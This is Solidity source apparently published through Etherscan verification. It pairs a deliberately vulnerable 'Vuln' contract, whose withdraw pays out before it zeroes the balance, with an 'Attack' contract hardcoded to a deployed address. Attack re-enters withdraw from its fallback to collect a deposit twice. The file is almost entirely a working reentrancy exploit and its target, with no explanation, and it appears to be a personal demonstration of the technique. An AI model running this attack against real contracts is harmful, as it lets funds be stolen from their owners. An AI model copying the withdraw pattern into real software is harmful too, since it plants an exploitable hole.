/**
 *Submitted for verification at Etherscan.io on 2021-12-08
*/

// Target
contract Vuln {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        // Increment their balance with whatever they pay
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // Refund their balance
        msg.sender.call{value: balances[msg.sender]}("");

        // Set their balance to 0
        balances[msg.sender] = 0;
    }
}

// Contract for haxoring the target
contract Attack {

    Vuln public v = Vuln(0x36A540E3A78084962B75E25877CfACf8846Be018);
    uint public i = 1;   

    // Defining a constructor
    // constructor() public {
    //     i = 1;   
    // }

    function doTheThing() public payable {
        // Give moneys
        v.deposit{value: msg.value}();
  
        // Get more moneys back
        v.withdraw();
    }
    fallback() external payable{
        if (i < 2) {
            i = 2;
            v.withdraw();
        }
    }
}